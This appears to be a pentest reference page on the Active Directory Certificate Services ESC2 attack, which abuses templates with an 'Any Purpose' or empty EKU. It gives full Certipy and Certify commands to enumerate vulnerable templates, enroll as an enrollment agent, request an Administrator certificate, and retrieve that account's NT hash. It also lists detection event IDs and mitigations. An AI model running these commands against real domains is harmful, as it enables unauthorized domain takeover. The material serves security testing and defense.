---
title: "Attack #28 — ESC2 Any Purpose EKU No EKU"
description: "ESC2 exploits certificate templates configured with the \"Any Purpose\" Extended Key Usage (EKU) (OID 2.5.29.37.0) or no EKU at all. Such certificates are…"
category: active-directory
tags: ["active-directory", "adcs", "privilege-escalation"]
tools: ["Certipy", "Certify", "PowerShell"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/AD-Attack/Category-Four/🟢 Attack #28 — ESC2 Any Purpose EKU No EKU.md"
---
# 🟢 Attack #28 — ESC2: Any Purpose EKU / No EKU

***

## 📖 How It Works

ESC2 exploits certificate templates configured with the **"Any Purpose" Extended Key Usage (EKU)** (OID `2.5.29.37.0`) or **no EKU at all**. Such certificates are treated as universal — they can function as any EKU, including Client Authentication and Certificate Request Agent. This means a low-privileged user who enrolls for an ESC2-vulnerable certificate can use it as an **Enrollment Agent** to request certificates on behalf of any other user, including Domain Admins.

### Vulnerable Template Conditions

- Template is published/enabled on a CA
- Low-privileged users (Authenticated Users / Domain Users) have enrollment rights
- EKU is set to "Any Purpose" OR is completely empty
- Manager approval is NOT required
- Authorized signatures are NOT required

***

## ⚙️ Prerequisites

| Requirement | Detail |
|---|---|
| **Enrollment rights on ESC2 template** | Domain Users / Authenticated Users can enroll |
| **ADCS deployed** | Certificate Authority must be running |

***

## 🛠️ Tools

| Tool | Platform | Notes |
|---|---|---|
| **Certipy** | Linux | `find -vulnerable`, `req` for enrollment |
| **Certify** | Windows | `find /vulnerable`, `request` for enrollment |

***

## 💻 Full Commands

### 🔵 Enumerate ESC2 Templates

```bash
# ── Certipy ───────────────────────────────────────────────────────────────────
certipy find -u low_user@corp.local -p 'Password1' -dc-ip 10.10.10.10 -vulnerable -stdout
# Look for: [!] Vulnerabilities: ESC2
```

```powershell
# ── Certify ───────────────────────────────────────────────────────────────────
.\Certify.exe find /vulnerable
# Look for templates with "Any Purpose" or empty EKU
```

### 🔴 Exploit ESC2

```bash
# ── Step 1: Enroll for the ESC2 certificate ───────────────────────────────────
certipy req -u low_user@corp.local -p 'Password1' -ca CORP-CA \
  -template VulnTemplate -dc-ip 10.10.10.10

# ── Step 2: Use as enrollment agent to request cert as Administrator ──────────
certipy req -u low_user@corp.local -p 'Password1' -ca CORP-CA \
  -template User -on-behalf-of 'corp\Administrator' \
  -pfx low_user.pfx -dc-ip 10.10.10.10

# ── Step 3: Authenticate with the Administrator certificate ──────────────────
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
# Returns NT hash for Administrator
```

```powershell
# ── Certify (Windows) ─────────────────────────────────────────────────────────
.\Certify.exe request /ca:CORP-CA /template:VulnTemplate
# Use resulting cert as enrollment agent for further requests
```

***

## 🛡️ Detection — Event IDs

| Event ID | Source | What to Look For |
|---|---|---|
| **4886** | Security Log (CA) | Certificate enrollment — track low-priv users enrolling for any-purpose templates |
| **4887** | Security Log (CA) | Certificate request approved |
| **4768** | Security Log (DC) | PKINIT TGT request using the forged certificate |

***

## 🔗 Attack Chain Context

```
[ESC2] ──→ Any Purpose cert → Enrollment Agent → impersonate any user
         │
         ├──→ 🔗 Used as stepping stone to ESC3-style enrollment agent abuse
         ├──→ 🔑 Low-priv user → DA certificate → domain compromise
         └──→ 💀 Defeated by: restrict EKUs, require approval, audit enrollment
```

***

> ✅ **Attack #28 — ESC2 complete.**
